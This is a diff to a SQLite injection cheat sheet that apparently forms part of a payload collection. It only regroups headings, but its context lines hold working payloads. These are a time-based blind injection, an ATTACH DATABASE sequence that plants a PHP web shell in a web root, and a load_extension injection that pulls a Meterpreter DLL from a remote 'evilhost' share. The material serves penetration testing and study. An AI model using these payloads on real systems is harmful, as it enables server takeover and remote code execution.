@@ -12,8 +12,9 @@
 * [Boolean - Extract info](#boolean---extract-info)
 * [Boolean - Error based](#boolean---error-based)
 * [Time based](#time-based)
-* [Remote Command Execution using SQLite command - Attach Database](#remote-command-execution-using-sqlite-command---attach-database)
-* [Remote Command Execution using SQLite command - Load_extension](#remote-command-execution-using-sqlite-command---load_extension)
+* [Remote Code Execution](#remote-code-execution)
+    * [Attach Database](#attach-database)
+    * [Load_extension](#load_extension)
 * [References](#references)
 
 
@@ -100,7 +101,9 @@ AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
 ```
 
 
-## Remote Command Execution using SQLite command - Attach Database
+## Remote Code Execution
+
+### Attach Database
 
 ```sql
 ATTACH DATABASE '/var/www/lol.php' AS lol;
@@ -108,7 +111,7 @@ CREATE TABLE lol.pwn (dataz text);
 INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
 ```
 
-## Remote Command Execution using SQLite command - Load_extension
+### Load_extension
 
 ```sql
 UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
